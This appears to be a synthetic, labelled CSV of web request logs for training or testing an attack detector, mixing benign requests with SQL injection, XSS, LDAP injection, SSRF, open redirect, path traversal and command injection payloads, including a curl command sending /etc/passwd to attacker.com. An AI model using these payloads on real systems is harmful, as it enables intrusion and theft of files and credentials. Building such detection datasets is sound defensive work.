timestamp,source_ip,dest_ip,method,host,path,query_string,full_url,user_agent,attack_type,is_attack
2026-04-07T13:20:51.798599,172.16.0.79,10.0.0.4,HEAD,10.0.0.50,/api/v1/status,id=123,http://10.0.0.50/api/v1/status?id=123,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:20:03.093708,192.168.1.214,172.16.0.69,GET,webapp.internal,/load,src=http%3A%2F%2F127.1%2F,http://webapp.internal/load?src=http%3A%2F%2F127.1%2F,python-requests/2.31.0,ssrf,1
2026-04-07T13:20:43.427029,172.16.0.132,172.16.0.19,GET,admin.example.com,/cart,,http://admin.example.com/cart,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:19:10.775860,192.168.1.16,10.0.0.184,GET,192.168.1.100,/redirect,goto=%2F%2Fgoogle.com%252f%40evil.com,http://192.168.1.100/redirect?goto=%2F%2Fgoogle.com%252f%40evil.com,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),open_redirect,1
2026-04-07T13:19:11.567561,172.16.0.104,192.168.1.168,GET,10.0.0.50,/url,return=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,http://10.0.0.50/url?return=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",open_redirect,1
2026-04-07T13:21:59.546067,10.0.0.51,172.16.0.102,GET,10.0.0.50,/download,template=..\..\..\windows\system32\config\sam,https://10.0.0.50/download?template=..\..\..\windows\system32\config\sam,masscan/1.3,path_traversal,1
2026-04-07T13:21:58.338176,10.0.0.237,172.16.0.209,POST,test-app.local,/images/logo.png,brand=apple&type=product,http://test-app.local/images/logo.png?brand=apple&type=product,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:21:15.654774,192.168.1.170,10.0.0.187,GET,api.example.com,/index.html,q=laptop&lang=en,http://api.example.com/index.html?q=laptop&lang=en,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:21:13.122680,172.16.0.214,192.168.1.193,GET,secure.example.com,/about,,https://secure.example.com/about,curl/8.4.0,benign,0
2026-04-07T13:19:38.637405,192.168.1.219,10.0.0.179,HEAD,api.example.com,/blog/post/1,,http://api.example.com/blog/post/1,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:19:42.594862,172.16.0.251,192.168.1.150,GET,test-app.local,/,id=123&filter=recent,http://test-app.local/?id=123&filter=recent,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:21:09.461027,10.0.0.123,192.168.1.112,POST,webapp.internal,/search,,https://webapp.internal/search,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:22:07.265274,192.168.1.133,172.16.0.182,GET,api.example.com,/directory,query=admin%2A,http://api.example.com/directory?query=admin%2A,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",ldap_injection,1
2026-04-07T13:19:57.008669,10.0.0.232,192.168.1.252,POST,example.com,/,page=1&format=json,https://example.com/?page=1&format=json,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:19:24.645082,192.168.1.14,172.16.0.96,GET,test-app.local,/privacy,id=123&user=john,http://test-app.local/privacy?id=123&user=john,python-requests/2.31.0,benign,0
2026-04-07T13:22:05.830130,192.168.1.25,10.0.0.152,POST,example.com,/,user=john,https://example.com/?user=john,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:19:32.744771,172.16.0.189,172.16.0.75,GET,shop.example.com,/cart,,http://shop.example.com/cart,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:22:16.404686,10.0.0.65,172.16.0.24,GET,10.0.0.50,/feedback,search=%3Cmarquee%20onstart%3Dalert%281%29%3E,http://10.0.0.50/feedback?search=%3Cmarquee%20onstart%3Dalert%281%29%3E,sqlmap/1.7.12#dev,xss,1
2026-04-07T13:18:57.599818,172.16.0.10,192.168.1.42,GET,test-app.local,/blog/category/tech,to=2024-12-31&order=name,http://test-app.local/blog/category/tech?to=2024-12-31&order=name,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:18:56.224297,192.168.1.203,192.168.1.186,POST,shop.example.com,/ping,host=test; curl http://attacker.com/exfil?data=$(cat /etc/passwd),http://shop.example.com/ping?host=test; curl http://attacker.com/exfil?data=$(cat /etc/passwd),masscan/1.3,command_injection,1
2026-04-07T13:21:35.166059,192.168.1.124,192.168.1.34,GET,10.0.0.50,/products,user=' OR '1'='1' /*,https://10.0.0.50/products?user=' OR '1'='1' /*,Nmap Scripting Engine,sql_injection,1
2026-04-07T13:21:47.401043,192.168.1.125,10.0.0.105,GET,10.0.0.50,/blog,id=123&type=product,http://10.0.0.50/blog?id=123&type=product,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:20:26.181543,172.16.0.117,192.168.1.209,GET,test-app.local,/api/orders,limit=10&to=2024-12-31&order=name,https://test-app.local/api/orders?limit=10&to=2024-12-31&order=name,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",benign,0
2026-04-07T13:19:57.336414,10.0.0.212,10.0.0.153,GET,webapp.internal,/file,page=....//....//....//etc/passwd,http://webapp.internal/file?page=....//....//....//etc/passwd,gobuster/3.6,path_traversal,1
2026-04-07T13:18:45.515284,10.0.0.88,172.16.0.47,GET,test-app.local,/search,filter=admin%2A,http://test-app.local/search?filter=admin%2A,Nmap Scripting Engine,ldap_injection,1
2026-04-07T13:20:37.301217,10.0.0.111,192.168.1.208,HEAD,webapp.internal,/search,,http://webapp.internal/search,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:20:14.247090,10.0.0.69,172.16.0.136,HEAD,api.example.com,/about,to=2024-12-31,http://api.example.com/about?to=2024-12-31,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:22:13.612870,192.168.1.101,192.168.1.12,HEAD,api.example.com,/blog/category/tech,brand=apple&id=123,https://api.example.com/blog/category/tech?brand=apple&id=123,python-requests/2.31.0,benign,0
2026-04-07T13:22:38.781139,192.168.1.198,192.168.1.205,GET,example.com,/comment,"message='><script>alert(String.fromCharCode(88,83,83))</script>","http://example.com/comment?message='><script>alert(String.fromCharCode(88,83,83))</script>",nuclei,xss,1
2026-04-07T13:20:42.076520,10.0.0.74,172.16.0.7,GET,192.168.1.100,/contact,category=electronics,http://192.168.1.100/contact?category=electronics,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:22:27.325297,10.0.0.104,10.0.0.184,GET,192.168.1.100,/js/main.js,sort=asc&status=active,http://192.168.1.100/js/main.js?sort=asc&status=active,curl/8.4.0,benign,0
2026-04-07T13:18:50.953842,10.0.0.177,172.16.0.235,GET,webapp.internal,/api/user,uid=admin%29%28%26%29,http://webapp.internal/api/user?uid=admin%29%28%26%29,sqlmap/1.7.12#dev,ldap_injection,1
2026-04-07T13:20:42.399482,172.16.0.118,192.168.1.117,GET,admin.example.com,/css/style.css,limit=10,http://admin.example.com/css/style.css?limit=10,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:22:21.051610,10.0.0.14,10.0.0.188,GET,test-app.local,/search,search=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,http://test-app.local/search?search=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",xss,1
2026-04-07T13:20:58.880522,172.16.0.149,10.0.0.181,GET,admin.example.com,/search,sort=asc,http://admin.example.com/search?sort=asc,curl/8.4.0,benign,0
2026-04-07T13:22:26.636986,192.168.1.191,172.16.0.245,GET,shop.example.com,/help,format=json,http://shop.example.com/help?format=json,python-requests/2.31.0,benign,0
2026-04-07T13:21:58.332913,172.16.0.115,172.16.0.35,GET,example.com,/events,,http://example.com/events,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:20:38.293418,192.168.1.234,172.16.0.126,GET,test-app.local,/download//etc/passwd,,http://test-app.local/download//etc/passwd,nikto/2.5.0,path_traversal,1
2026-04-07T13:19:51.280414,10.0.0.137,172.16.0.23,GET,admin.example.com,/notifications,from=2024-01-01&category=electronics,http://admin.example.com/notifications?from=2024-01-01&category=electronics,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:19:35.225563,172.16.0.119,192.168.1.50,GET,api.example.com,/out,redirect=%2F%2Fevil.com,http://api.example.com/out?redirect=%2F%2Fevil.com,gobuster/3.6,open_redirect,1
2026-04-07T13:19:59.743883,192.168.1.118,172.16.0.117,GET,webapp.internal,/file,page=....//....//....//etc/passwd,http://webapp.internal/file?page=....//....//....//etc/passwd,python-requests/2.31.0,path_traversal,1
2026-04-07T13:20:18.022402,172.16.0.181,10.0.0.75,POST,api.example.com,/feedback,query=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,http://api.example.com/feedback?query=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,Nmap Scripting Engine,xss,1
2026-04-07T13:21:05.871899,192.168.1.140,172.16.0.51,GET,secure.example.com,/help,,https://secure.example.com/help,python-requests/2.31.0,benign,0
2026-04-07T13:20:30.932213,192.168.1.165,10.0.0.5,POST,admin.example.com,/blog/category/tech,,http://admin.example.com/blog/category/tech,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:20:59.279109,192.168.1.78,10.0.0.241,POST,webapp.internal,/api/v1/status,view=list&category=electronics&to=2024-12-31,http://webapp.internal/api/v1/status?view=list&category=electronics&to=2024-12-31,PostmanRuntime/7.35.0,benign,0
2026-04-07T13:20:55.310276,10.0.0.229,10.0.0.152,GET,10.0.0.50,/load,path=/etc/passwd,https://10.0.0.50/load?path=/etc/passwd,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
2026-04-07T13:21:57.544751,10.0.0.84,172.16.0.112,GET,webapp.internal,/api/v1/status,,https://webapp.internal/api/v1/status,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:21:13.857764,10.0.0.45,192.168.1.254,GET,webapp.internal,/register,from=2024-01-01&format=json&type=product,http://webapp.internal/register?from=2024-01-01&format=json&type=product,curl/8.4.0,benign,0
2026-04-07T13:23:13.992271,192.168.1.101,172.16.0.248,POST,webapp.internal,/comment,input=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,http://webapp.internal/comment?input=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,nuclei,xss,1
2026-04-07T13:23:00.039500,192.168.1.147,172.16.0.208,POST,webapp.internal,/login,,http://webapp.internal/login,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:19:05.291570,10.0.0.52,172.16.0.85,GET,test-app.local,/checkout,brand=apple&filter=recent,http://test-app.local/checkout?brand=apple&filter=recent,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:19:32.202164,172.16.0.47,172.16.0.201,POST,api.example.com,/news,,http://api.example.com/news,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:23:20.185686,192.168.1.20,192.168.1.234,GET,api.example.com,/api/users,,https://api.example.com/api/users,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:21:42.087515,192.168.1.172,192.168.1.113,GET,admin.example.com,/redir,dest=%2F%2Fevil.com,https://admin.example.com/redir?dest=%2F%2Fevil.com,wfuzz/3.1.0,open_redirect,1
2026-04-07T13:19:42.182335,172.16.0.142,10.0.0.245,GET,10.0.0.50,/terms,user=john,https://10.0.0.50/terms?user=john,curl/8.4.0,benign,0
2026-04-07T13:22:07.477799,192.168.1.240,10.0.0.107,GET,webapp.internal,/exec,cmd=test`sleep 10`,https://webapp.internal/exec?cmd=test`sleep 10`,burpsuite,command_injection,1
2026-04-07T13:21:31.010991,172.16.0.33,172.16.0.32,HEAD,192.168.1.100,/checkout,filter=recent&format=json&q=laptop,https://192.168.1.100/checkout?filter=recent&format=json&q=laptop,curl/8.4.0,benign,0
2026-04-07T13:20:09.497075,192.168.1.183,192.168.1.237,GET,shop.example.com,/load,uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,http://shop.example.com/load?uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F,gobuster/3.6,ssrf,1
2026-04-07T13:19:46.375357,10.0.0.209,172.16.0.77,GET,admin.example.com,/checkout,from=2024-01-01&id=123,http://admin.example.com/checkout?from=2024-01-01&id=123,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:21:55.623837,10.0.0.232,172.16.0.26,GET,example.com,/api/orders,sort=asc&lang=en&user=john,https://example.com/api/orders?sort=asc&lang=en&user=john,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),benign,0
2026-04-07T13:21:48.026523,10.0.0.118,172.16.0.187,GET,secure.example.com,/admin,order=' OR 'x'='x,http://secure.example.com/admin?order=' OR 'x'='x,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",sql_injection,1
2026-04-07T13:21:05.602577,172.16.0.64,172.16.0.47,GET,shop.example.com,/blog/category/tech,category=electronics&lang=en,http://shop.example.com/blog/category/tech?category=electronics&lang=en,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,benign,0
2026-04-07T13:22:01.736386,172.16.0.244,10.0.0.160,POST,10.0.0.50,/register,,http://10.0.0.50/register,python-requests/2.31.0,benign,0
2026-04-07T13:19:36.335698,10.0.0.249,10.0.0.126,POST,secure.example.com,/exec,ip=test| base64 /etc/passwd,http://secure.example.com/exec?ip=test| base64 /etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,command_injection,1
2026-04-07T13:21:45.130816,172.16.0.41,192.168.1.114,POST,example.com,/notifications,,http://example.com/notifications,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:21:47.059645,172.16.0.119,10.0.0.8,HEAD,example.com,/logout,status=active&category=electronics&q=laptop,http://example.com/logout?status=active&category=electronics&q=laptop,python-requests/2.31.0,benign,0
2026-04-07T13:21:45.757448,10.0.0.227,172.16.0.192,HEAD,admin.example.com,/cart,type=product&to=2024-12-31,http://admin.example.com/cart?type=product&to=2024-12-31,python-requests/2.31.0,benign,0
2026-04-07T13:21:03.449282,10.0.0.103,172.16.0.207,GET,example.com,/api/v1/health,filter=recent&order=name&to=2024-12-31,https://example.com/api/v1/health?filter=recent&order=name&to=2024-12-31,python-requests/2.31.0,benign,0
2026-04-07T13:21:33.819625,172.16.0.87,10.0.0.38,GET,webapp.internal,/search,user=x%29%28%7C%28cn%3D%2A%29,https://webapp.internal/search?user=x%29%28%7C%28cn%3D%2A%29,dirbuster,ldap_injection,1
2026-04-07T13:23:32.350662,192.168.1.187,10.0.0.101,GET,admin.example.com,/notifications,format=json,http://admin.example.com/notifications?format=json,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:19:58.475494,192.168.1.136,172.16.0.215,GET,10.0.0.50,/search,user=%2A%28%29%7C%2526%27,http://10.0.0.50/search?user=%2A%28%29%7C%2526%27,nuclei,ldap_injection,1
2026-04-07T13:20:22.753206,172.16.0.129,10.0.0.166,POST,admin.example.com,/feedback,"search=<video><source onerror=""alert(1)"">","https://admin.example.com/feedback?search=<video><source onerror=""alert(1)"">",Nmap Scripting Engine,xss,1
2026-04-07T13:22:25.381286,192.168.1.3,172.16.0.24,GET,api.example.com,/load,path=php://filter/convert.base64-encode/resource=index.php,https://api.example.com/load?path=php://filter/convert.base64-encode/resource=index.php,masscan/1.3,path_traversal,1
2026-04-07T13:24:13.968447,172.16.0.185,192.168.1.219,GET,admin.example.com,/api/orders,id=123&lang=en,http://admin.example.com/api/orders?id=123&lang=en,python-requests/2.31.0,benign,0
2026-04-07T13:20:09.730974,172.16.0.173,192.168.1.73,GET,test-app.local,/terms,to=2024-12-31,http://test-app.local/terms?to=2024-12-31,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:19:34.678075,10.0.0.178,192.168.1.86,POST,shop.example.com,/js/main.js,limit=10&q=laptop,http://shop.example.com/js/main.js?limit=10&q=laptop,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:24:05.174829,10.0.0.50,10.0.0.9,GET,example.com,/redir,return=%2F%5Cevil.com,http://example.com/redir?return=%2F%5Cevil.com,dirbuster,open_redirect,1
2026-04-07T13:23:42.484913,172.16.0.46,192.168.1.117,GET,test-app.local,/checkout,,http://test-app.local/checkout,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",benign,0
2026-04-07T13:20:10.039047,172.16.0.106,10.0.0.242,GET,shop.example.com,/goto,goto=%2F%2F%2Fevil.com,https://shop.example.com/goto?goto=%2F%2F%2Fevil.com,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",open_redirect,1
2026-04-07T13:21:59.492966,10.0.0.60,192.168.1.139,GET,admin.example.com,/index.html,category=electronics,https://admin.example.com/index.html?category=electronics,curl/8.4.0,benign,0
2026-04-07T13:21:55.589827,10.0.0.243,172.16.0.44,HEAD,test-app.local,/news,type=product&lang=en&status=active,http://test-app.local/news?type=product&lang=en&status=active,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:23:35.363141,172.16.0.130,192.168.1.231,GET,example.com,/out,target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,http://example.com/out?target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,Nmap Scripting Engine,open_redirect,1
2026-04-07T13:24:30.677911,172.16.0.19,10.0.0.4,GET,example.com,/ping,run=test%7C%7C%20dir,https://example.com/ping?run=test%7C%7C%20dir,dirbuster,command_injection,1
2026-04-07T13:23:55.221981,172.16.0.69,192.168.1.169,GET,shop.example.com,/help,,http://shop.example.com/help,python-requests/2.31.0,benign,0
2026-04-07T13:24:21.413348,10.0.0.105,10.0.0.51,GET,example.com,/redir,target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,https://example.com/redir?target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",open_redirect,1
2026-04-07T13:19:52.001654,172.16.0.5,172.16.0.167,HEAD,example.com,/api/v2/data,,https://example.com/api/v2/data,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:24:16.402182,10.0.0.69,192.168.1.94,GET,10.0.0.50,/cart,,https://10.0.0.50/cart,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",benign,0
2026-04-07T13:20:49.893441,10.0.0.157,10.0.0.228,GET,secure.example.com,/load,doc=/etc/passwd,http://secure.example.com/load?doc=/etc/passwd,masscan/1.3,path_traversal,1
2026-04-07T13:23:50.254369,10.0.0.240,172.16.0.53,GET,secure.example.com,/redir,url=https%3A%2F%2Fevil.com,https://secure.example.com/redir?url=https%3A%2F%2Fevil.com,masscan/1.3,open_redirect,1
2026-04-07T13:23:58.578457,10.0.0.249,10.0.0.7,GET,example.com,/return,target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,http://example.com/return?target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,open_redirect,1
2026-04-07T13:21:04.576636,192.168.1.201,192.168.1.223,HEAD,example.com,/,,http://example.com/,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",benign,0
2026-04-07T13:23:53.832589,172.16.0.43,172.16.0.7,GET,shop.example.com,/include,file=....\....\....\etc\passwd,https://shop.example.com/include?file=....\....\....\etc\passwd,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",path_traversal,1
